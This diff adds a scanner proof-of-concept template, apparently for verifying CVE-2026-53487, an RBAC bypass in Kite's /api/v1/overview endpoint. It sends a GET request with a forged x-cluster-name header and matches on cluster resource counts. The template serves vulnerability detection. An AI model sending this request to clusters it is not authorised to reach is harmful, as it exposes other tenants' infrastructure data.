@@ -1,0 +1,37 @@
+[info]
+author = "ave"
+description = "验证 Kite /api/v1/overview 接口是否存在集群 RBAC 绕过漏洞。已认证低权限用户可通过 x-cluster-name 请求头访问未授权集群的聚合资源数据（节点、Pod、命名空间、服务、CPU 和内存统计）。需预先持有有效会话凭证。"
+id = "POC-AVE-2026-0398"
+name = "CVE-2026-53487 Kite RBAC Bypass PoC"
+severity = "medium"
+tags = ["ave-2026-0398"]
+vuln_id = [
+    "CVE-2026-53487",
+    "AVE-2026-0398",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/api/v1/overview"
+protocol = "http"
+
+[poc.requests.headers]
+x-cluster-name = "target-cluster"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "totalNodes",
+    "totalPods",
+    "totalNamespaces",
+]
